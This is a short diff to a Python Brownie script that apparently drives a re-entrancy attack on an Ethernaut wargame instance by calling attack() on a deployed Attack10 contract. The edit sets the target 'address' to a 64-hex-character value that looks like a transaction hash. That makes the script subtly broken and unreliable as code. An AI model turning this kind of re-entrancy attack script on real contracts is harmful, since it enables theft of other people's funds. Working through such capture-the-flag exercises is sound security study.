@@ -1,7 +1,9 @@
 from scripts.helpful_scripts import get_account
 from brownie import web3, Attack10, interface
 
-ETHERNAUT_INSTANCE = "0xc734f6B53Ac3b11afdeE4cA1dbFee83521ED267d"
+ETHERNAUT_INSTANCE = (
+    "0x2631149b0c36a4a0fff2fdefb6de1d467a2b0a0281dca99802c9cd04c1c46b55"
+)
 AMOUNT = "0.01 ether"
 GAS_LIMIT = 6000000
 
@@ -14,14 +16,5 @@ def main():
 
     # print(f"\nre-entrancy attack successfully deployed\n")
 
-    # # interface.ReentrantInterface(ETHERNAUT_INSTANCE).donate(
-    # #     attack.address, {"from": player, "value": AMOUNT}
-    # # )
-    # target.donate(attack.address, {"from": player, "value": AMOUNT})
-
-    # # the balance of ETHERNAUT_INSTANCE
-    # balance_ether = web3.fromWei(target.balance(), "ether")
-    # print(f"\nBalance of the attack contract = {balance_ether}\n")
-
-    tx = attack.attack({"from": player, "value": AMOUNT, "gas_limit": GAS_LIMIT})
+    tx = attack.attack({"from": player, "allow_revert": True, "gas_limit": GAS_LIMIT})
     print(f"\n{tx}\n")
